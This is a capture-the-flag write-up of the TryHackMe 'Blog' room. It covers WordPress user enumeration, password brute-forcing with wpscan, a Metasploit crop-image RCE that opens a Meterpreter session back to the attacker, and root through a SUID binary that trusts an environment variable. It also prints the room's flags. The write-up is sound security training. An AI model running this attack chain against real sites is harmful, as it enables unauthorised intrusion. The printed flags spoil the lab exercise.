# 📝 TryHackMe: Blog — Writeup

| Info | Details |
|------|---------|
| **Room** | Blog |
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **Author** | Havk |

---

## 🎯 Overview

This room involves exploiting a vulnerable WordPress 5.0 installation through an authenticated RCE vulnerability, followed by privilege escalation via a custom SUID binary that trusts environment variables.

---

## 🔍 Reconnaissance

### Adding Host

```bash
echo "10.10.x.x blog.thm" >> /etc/hosts
```

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt blog.thm
```

### WordPress Enumeration

Identified WordPress version **5.0** — vulnerable to **Crop-image RCE** (CVE-2019-8943).

However, this exploit requires authentication. Time to find credentials.

---

## 👥 User Enumeration

```bash
wpscan --url http://blog.thm/ --enumerate u
```

**Users found:**
- `kwheel`
- `bjoel`

---

## 🔓 Password Brute Force

```bash
wpscan --url http://blog.thm --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt
```

**Result:**
```
Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1
```

---

## 💥 Exploitation — Initial Access

### Using Metasploit

```bash
msfconsole
```

```bash
use multi/http/wp_crop_rce
set RHOSTS blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST <your-ip>
run
```

**Result:** Meterpreter session as `www-data`

---

## 🔎 Post-Exploitation & Enumeration

### First Attempt (Rabbit Hole)

```bash
cat /home/bjoel/user.txt
```

Found a file, but it was **NOT the real flag** — a decoy!

### Finding SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Found unusual binary:**
```
/usr/sbin/checker
```

### Analyzing the Binary

```bash
file /usr/sbin/checker
```
```
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object...
```

```bash
/usr/sbin/checker
```
```
Not an Admin
```

### Reverse Engineering

```bash
ltrace /usr/sbin/checker
```
```
getenv("admin") = nil
puts("Not an Admin")
```

The binary checks for an environment variable `admin`!

---

## 👑 Privilege Escalation

### Exploiting the Vulnerability

```bash
admin=1 /usr/sbin/checker
```

```
root@blog:/#
```

**ROOT ACCESS ACHIEVED!**

---

## 🏁 Flags

### User Flag

```bash
cat /media/usb/user.txt
```
```
c8421899aae571f7af486492b71a8ab7
```

### Root Flag

```bash
cat /root/root.txt
```
```
9a0b2b618bef9bfa7ac28c1353d9f318
```

---

## 📚 Lessons Learned

> **"Always look at all files attentively"**

| Lesson | Description |
|--------|-------------|
| **Don't trust first findings** | The user.txt in /home/bjoel was a rabbit hole |
| **Check ALL SUID binaries** | Custom binaries like `checker` are easy to miss |
| **Analyze unusual binaries** | Use `ltrace`, `strings`, `file` to understand behavior |
| **Environment variables** | SUID programs should NEVER trust user-controlled env vars |

---

## 🛠️ Tools Used

- `nmap`
- `wpscan`
- `Metasploit (wp_crop_rce)`
- `ltrace`
- `find`

---

## 📊 Attack Chain

```
blog.thm → WordPress 5.0 → User Enum (kwheel, bjoel)
    ↓
Brute Force → kwheel:cutiepie1
    ↓
wp_crop_rce → Meterpreter (www-data)
    ↓
SUID /usr/sbin/checker → getenv("admin")
    ↓
admin=1 /usr/sbin/checker → ROOT!
```

---

**Room Pwned!** 🎉